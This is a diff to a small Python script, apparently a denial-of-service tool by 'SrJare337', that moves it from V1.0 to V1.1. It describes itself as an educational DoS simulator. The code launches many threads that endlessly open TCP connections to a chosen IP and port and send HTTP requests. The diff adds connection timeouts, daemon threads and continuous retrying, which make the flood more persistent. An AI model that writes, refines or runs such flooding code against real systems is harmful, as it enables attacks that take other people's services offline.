@@ -26,9 +26,9 @@ print(Fore.GREEN + Style.BRIGHT + """
  \___ \  
  ____) | 
 |_____/  
-V1.0""")
+V1.1""")
 
-print(Fore.BLUE + Style.BRIGHT + "V1.0")
+print(Fore.BLUE + Style.BRIGHT + "V1.1")
 print(Fore.BLUE + Style.BRIGHT + "Srjare337")
 
 parser = argparse.ArgumentParser(description="Simulador de Ataque DoS para fins educacionais")
@@ -43,33 +43,33 @@ def attack(target_ip, target_port):
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)  # Define um tempo limite para a conexão
             s.connect((target_ip, target_port))
             s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
             s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
             s.close()
         except socket.error:
-            pass
+            continue  # Continue tentando em caso de erro
 
 def start_attack(target_ip, target_port, num_threads, duration):
-    print(Fore.GREEN + Style.BRIGHT + "Iniciando ataque em {}:{}".format(target_ip, target_port))
-    print(Fore.RED + Style.BRIGHT + "Número de threads: {}".format(num_threads))
-    print(Fore.YELLOW + Style.BRIGHT + "Duração do ataque: {} segundos".format(duration))
+    print(Fore.GREEN + Style.BRIGHT + f"Iniciando ataque em {target_ip}:{target_port}")
+    print(Fore.RED + Style.BRIGHT + f"Número de threads: {num_threads}")
+    print(Fore.YELLOW + Style.BRIGHT + f"Duração do ataque: {duration} segundos")
     print(Fore.CYAN + Style.BRIGHT + "⚡ Ataque iniciado! ⚡")
 
     threads = []
     for i in range(num_threads):
         thread = threading.Thread(target=attack, args=(target_ip, target_port))
+        thread.daemon = True  # Permite que o thread seja encerrado quando o programa principal terminar
         thread.start()
         threads.append(thread)
         if i % 10 == 0:
-            print(Fore.MAGENTA + Style.BRIGHT + "Thread {} iniciada...".format(i))
+            print(Fore.MAGENTA + Style.BRIGHT + f"Thread {i} iniciada...")
 
     time.sleep(duration)
 
-    for thread in threads:
-        thread.join()
-
-    print(Fore.RED + Style.BRIGHT + "Ataque finalizado. Todos os threads foram encerrados.")
+    # Não é necessário esperar todos os threads terminarem, pois são daemon
+    print(Fore.RED + Style.BRIGHT + "Ataque finalizado.")
     print(Fore.CYAN + Style.BRIGHT + "⚠️ Ataque concluído! ⚠️")
 
 def signal_handler(sig, frame):
@@ -84,5 +84,5 @@ if __name__ == "__main__":
 
     print(Fore.GREEN + Style.BRIGHT + "\n---")
     print(Fore.BLUE + Style.BRIGHT + "Créditos: SrJare337")
-    print(Fore.BLUE + Style.BRIGHT + "Versão: V1.0")
+    print(Fore.BLUE + Style.BRIGHT + "Versão: V1.1")
     print(Fore.GREEN + Style.BRIGHT + "---")
